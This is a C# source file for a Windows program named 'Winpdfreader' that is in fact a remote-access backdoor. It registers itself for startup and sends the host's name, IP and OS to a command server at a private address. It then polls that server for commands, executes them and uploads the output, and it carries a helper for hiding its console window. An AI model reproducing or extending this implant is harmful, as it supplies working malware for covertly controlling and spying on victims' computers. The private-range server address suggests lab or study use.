// See https://aka.ms/new-console-template for more information

using System;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;

// dotnet publish -c Release -r win-x64 --self-contained

namespace Winpdfreader
{
    class Program
    {
        static void Main(string[] args)
        {
            // ConsoleExtension.Hide();
            GeneralInfo infoObj = new GeneralInfo();
            Persistance persObj = new Persistance(infoObj);
            Operations opsObj = new Operations(infoObj);
            

            var ts = new ThreadStart(ServInteraction);
            var bgThread = new Thread(ts);
            bgThread.Start();
            
            persObj.AddToStartup();
            // infoObj.printInfos();

            // if (args == null || args.Length == 0)
            // {
            //     opsObj.CmdParser(1, "download", fakeFile2);
            // }
            // else
            // {
            //     if (args.Length > 1)
            //     {
            //         opsObj.CmdParser(2, args[0], args[1]);
            //     }
            //     else
            //     {
            //         opsObj.CmdParser(2, args[0], "");
            //     }
            // }

            // opsObj.CmdParser(1, args, args);
            // opsObj.CommandParser("download https://google.com/index.html");
            // Console.WriteLine(args[0], args[1]);
            // Operations ops = new Operations(args[0], args[1]);
            // ops.CmdParser();

            // opsObj.CmdParser(2, "ipconfig", "");
        }

        // var ts = new ThreadStart(BackgroundMethod);
        // var backgroundThread = new Thread(ts);
        private static void ServInteraction()
        {
            // string fakeFile = "";
            // string fakeFile2 = "l";
            // string fakeFile3 = "";

            string registerUrl = "http://192.168.96.132/register.php";
            string getResults = "http://192.168.96.132/getResults.php";
            string getCmd = "http://192.168.96.132/getCmd.php";
            
            GeneralInfo infoObj = new GeneralInfo();
            Operations opsObj = new Operations(infoObj);
            
            System.Net.WebClient webClient = new WebClient();

            string hostParams = "hostname=" + infoObj.hostName + "&ip=" + infoObj.ipv4Address + "&os=" +
                                infoObj.oSystem;
            webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

            webClient.UploadString(registerUrl, hostParams);


            bool conn = true;
            int eCounter = 0;
            while (true)
            {
                if (eCounter > 19)
                    break;
                try
                {
                    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    string cmdGet = webClient.UploadString(getCmd, hostParams);
                    if (cmdGet.Length > 1)
                    {
                        Console.WriteLine(cmdGet);
                        string cmdResult = opsObj.CommandParser(cmdGet);
                        string resParams = "hostname=" + infoObj.hostName + "&ip=" + infoObj.ipv4Address + "&result=" +
                                           cmdResult;
                        webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        webClient.UploadString(getResults, resParams);
                    }

                    System.Threading.Thread.Sleep(5000);
                    eCounter = 0;
                }
                catch (Exception e)
                {
                    System.Threading.Thread.Sleep(5000);
                    Console.WriteLine(eCounter + " " + e.Message.ToString());
                    eCounter += 1;
                }
            }
        }
        
        static class ConsoleExtension {
            const int SW_HIDE = 0;
            const int SW_SHOW = 5;
            readonly static IntPtr handle = GetConsoleWindow();
            [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);

            public static void Hide() {
                ShowWindow(handle,SW_HIDE); //hide the console
            }
            public static void Show() {
                ShowWindow(handle,SW_SHOW); //show the console
            }
        }
    }
}